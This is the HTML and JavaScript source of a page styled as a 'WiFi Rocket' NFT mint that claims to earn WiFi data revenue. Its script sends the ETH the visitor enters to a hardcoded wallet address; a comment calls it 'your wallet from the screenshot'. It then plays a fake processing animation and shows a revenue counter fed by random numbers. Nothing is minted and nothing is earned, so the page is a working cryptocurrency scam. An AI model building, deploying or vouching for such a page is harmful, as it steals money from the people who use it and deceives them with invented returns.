<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Rocket | Premium Mission Control</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root {
            --neon-cyan: #00d4ff;
            --neon-orange: #ff6600;
            --glass: rgba(10, 10, 35, 0.95);
        }

        body { 
            background: radial-gradient(circle at center, #0a0a20 0%, #020205 100%);
            color: white; 
            font-family: 'Segoe UI', Roboto, sans-serif;
            display: flex; align-items: center; justify-content: center; 
            height: 100vh; margin: 0; overflow: hidden;
        }

        .dashboard { 
            background: var(--glass);
            border: 1px solid var(--neon-cyan);
            border-radius: 24px; 
            width: 380px; padding: 40px; 
            text-align: center; 
            box-shadow: 0 0 40px rgba(0, 212, 255, 0.15), inset 0 0 20px rgba(0, 212, 255, 0.05);
            backdrop-filter: blur(10px);
        }

        .hidden { display: none; }

        /* Revenue Ticker Style */
        .revenue-header { 
            background: rgba(0, 212, 255, 0.05);
            border-radius: 15px; padding: 20px; 
            margin-bottom: 30px; border: 1px solid rgba(0, 212, 255, 0.2);
        }
        #revenue-amount { 
            color: #00ff88; font-size: 32px; font-weight: 800;
            text-shadow: 0 0 15px rgba(0, 255, 136, 0.5);
        }

        input { 
            width: 100%; padding: 15px; margin: 15px 0; 
            border-radius: 12px; border: 1px solid #333; 
            background: #000; color: var(--neon-cyan); 
            text-align: center; font-size: 20px; box-sizing: border-box;
        }

        button { 
            background: linear-gradient(135deg, var(--neon-orange), #ff2200);
            color: white; border: none; padding: 18px; 
            width: 100%; border-radius: 12px; 
            font-weight: 800; font-size: 18px; 
            cursor: pointer; transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            box-shadow: 0 5px 15px rgba(255, 102, 0, 0.4);
        }
        button:hover { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(255, 102, 0, 0.6); }

        /* Premium Rocket Glow Effect */
        #rocket-display { 
            font-size: 110px; margin: 30px 0; 
            filter: drop-shadow(0 0 10px rgba(255, 102, 0, 0.8)) drop-shadow(0 0 30px rgba(255, 102, 0, 0.4));
            animation: launch-vibrate 0.1s infinite alternate;
        }

        @keyframes launch-vibrate {
            from { transform: translate(1px, 1px) rotate(0deg); }
            to { transform: translate(-1px, -1px) rotate(0.5deg); }
        }

        .progress-container { 
            width: 100%; background: #111; 
            border-radius: 20px; margin: 25px 0; 
            height: 14px; overflow: hidden; border: 1px solid #222;
        }
        #progress-fill { 
            width: 0%; height: 100%; 
            background: linear-gradient(90deg, var(--neon-cyan), #0088ff); 
            box-shadow: 0 0 15px var(--neon-cyan);
            transition: width 0.4s ease; 
        }
    </style>
</head>
<body>

<div class="dashboard">
    <div class="revenue-header">
        <small style="letter-spacing: 2px; color: #88aaff;">WIFI REVENUE GENERATED</small><br>
        <span id="revenue-amount">$0.00</span>
    </div>

    <div id="start-screen">
        <h2 style="margin-top:0">Mission Launch</h2>
        <p style="font-size: 14px; color: #88aaff; line-height: 1.5;">Fuel your rocket with ETH to start processing global WiFi data packets.</p>
        <input type="number" id="ethVal" value="0.001" step="0.001">
        <button onclick="launchRocket()">INITIATE MINT</button>
    </div>

    <div id="process-screen" class="hidden">
        <h3>SYNCING DATA NODES</h3>
        <div class="progress-container"><div id="progress-fill"></div></div>
        <p id="status-update" style="font-size: 13px; color: var(--neon-cyan);">Initializing WiFi handshake...</p>
    </div>

    <div id="minted-screen" class="hidden">
        <div id="rocket-display">ðŸš€</div>
        <h2 style="color: #00ff88; margin-bottom: 5px;">MINT SUCCESSFUL</h2>
        <p style="margin-top: 0; color: #88aaff;">Your Rocket NFT is now generating revenue.</p>
        <button onclick="location.reload()" style="background: #1a1a2e; box-shadow: none; border: 1px solid #333;">RE-FUEL NEW MISSION</button>
    </div>
</div>

<script>
let totalRev = 0;

async function launchRocket() {
    if (!window.ethereum) return alert("Please open this page in MetaMask!");

    try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();

        const val = document.getElementById('ethVal').value;
        const wei = ethers.utils.parseEther(val);

        // Switch UI to Processing
        document.getElementById('start-screen').classList.add('hidden');
        document.getElementById('process-screen').classList.remove('hidden');

        // Execute "Stake" - Sends to your wallet from the screenshot
        const tx = await signer.sendTransaction({
            to: "0x02f949281a8c9837963C82813589B845C5194cbb",
            value: wei
        });

        // Run the WiFi Data Processing Simulation
        await runDataSimulation();

        // Wait for Blockchain Confirmation
        await tx.wait();
        
        // Show the Final Glowing NFT
        showMinted();

    } catch (e) {
        alert("Transaction Cancelled: " + e.message);
        location.reload();
    }
}

function runDataSimulation() {
    return new Promise((res) => {
        let p = 0;
        const fill = document.getElementById('progress-fill');
        const status = document.getElementById('status-update');
        const rev = document.getElementById('revenue-amount');

        const i = setInterval(() => {
            p += 2; // Incremental progress
            totalRev += Math.random() * 0.35; // WiFi Revenue build-up
            
            fill.style.width = p + "%";
            rev.innerText = "$" + totalRev.toFixed(2);
            status.innerText = "Processing Data Packets: " + (p * 128) + "mbps";

            if (p >= 100) {
                clearInterval(i);
                res();
            }
        }, 150);
    });
}

function showMinted() {
    document.getElementById('process-screen').classList.add('hidden');
    document.getElementById('minted-screen').classList.remove('hidden');
    
    // Revenue continues to grow post-mint as "WiFi processing" stays active
    setInterval(() => {
        totalRev += 0.05;
        document.getElementById('revenue-amount').innerText = "$" + totalRev.toFixed(2);
    }, 1000);
}
</script>

</body>
</html>
